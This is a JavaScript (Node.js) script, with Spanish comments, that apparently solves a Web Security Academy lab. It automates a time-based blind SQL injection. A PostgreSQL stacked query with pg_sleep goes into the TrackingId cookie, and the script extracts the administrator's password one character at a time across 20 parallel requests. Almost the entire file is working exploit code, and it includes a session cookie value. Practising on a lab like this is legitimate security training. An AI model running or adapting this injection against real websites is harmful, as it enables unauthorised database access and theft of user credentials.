const axios = require('axios');

async function request({ url, path, trackingId, session, query }) {
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: url + path,
    headers: {
      accept:
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'es-ES,es;q=0.9,en;q=0.8,de;q=0.7,it;q=0.6',
      cookie: `TrackingId=${trackingId}${query}; session=${session}`,
      priority: 'u=0, i',
      referer: url,
      'sec-ch-ua':
        '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"macOS"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent':
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    },
  };

  return await axios.request(config);
}

function getAsciiCharacters() {
  const characters = [];
  // Rango de números en ASCII: 48 (0) a 57 (9)
  for (let i = 48; i <= 57; i++) {
    characters.push(String.fromCharCode(i));
  }
  // Rango de letras minúsculas en ASCII: 97 (a) a 122 (z)
  for (let i = 97; i <= 122; i++) {
    characters.push(String.fromCharCode(i));
  }
  return characters;
}

function nextChar(currentChar) {
  const charCode = currentChar.charCodeAt(0);

  // Si el carácter es un número (0-9)
  if (charCode >= 48 && charCode <= 57) {
    if (charCode === 57) {
      // Si es '9', finalizo la busqueda
      throw new Error('Finalizo la busqueda');
    } else {
      return String.fromCharCode(charCode + 1);
    }
  }

  // Si el carácter es una letra minúscula (a-z)
  if (charCode >= 97 && charCode <= 122) {
    if (charCode === 122) {
      return '0'; // Si es 'z', el siguiente es '0'
    } else {
      return String.fromCharCode(charCode + 1);
    }
  }

  // Si el carácter no es válido (ni número ni letra minúscula)
  throw new Error(
    'El carácter proporcionado no es una letra minúscula ni un número.'
  );
}

async function run(charAt) {
  let char = 'a';
  let verify = false;

  while (true) {
    const time = Date.now();

    const params = {
      url: 'https://0aa9009e049b1c7183f1c42d00fb00c4.web-security-academy.net',
      path: '/filter?category=Pets',
      trackingId: `x' %3B SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,${charAt},1)='${char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- `,
      session: 'oxHzhnIssAq2Ls7xw1yclo2QgyAgFKik',
    };

    try {
      await request(params);

      const responseTime = (Date.now() - time) / 1000;

      console.log({ time: responseTime, charAt, char });

      if (responseTime > 10) {
        if (responseTime < 15) { // si el tiempo es mayor a 14 segundos se reintenta, porque puede ser un timeout de la app
          if (verify) {
            console.log('Verified', { char, charAt });
            return { char, charAt };
          } else {
            verify = true;
            // se verifica el mismo caracter
          }
        }
      } else {
        char = nextChar(char);
        verify = false;
        // se prosigue con el siguiente caracter
      }
    } catch (err) {
      console.log(err.message, params);
      // se reintenta con el mismo caracter
    }
  }
}

async function runPromises() {
  console.time('start');

  const promises = [];

  for (let i = 1; i <= 20; i++) {
    promises.push(run(i));
  }

  const resolvedPromises = await Promise.allSettled(promises);

  console.log(resolvedPromises);

  let pass = '';
  resolvedPromises.map((prom) => {
    if (prom.status === 'fulfilled') {
      pass += prom.value.char;
    } else {
      console.log(prom.reason);
    }
  });

  console.log(pass);

  console.timeEnd('start');
}

runPromises();

async function runIndividual() {
  try {
    const response = await request({
      url: 'https://0aa9009e049b1c7183f1c42d00fb00c4.web-security-academy.net',
      path: '/filter?category=Pets',
      trackingId: `x' %3B SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='z') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users-- `,
      session: 'oxHzhnIssAq2Ls7xw1yclo2QgyAgFKik',
    });

    console.log('SUCEED');
  } catch (err) {
    console.log(err);
  }
}

// runIndividual();
// console.log(run(1));
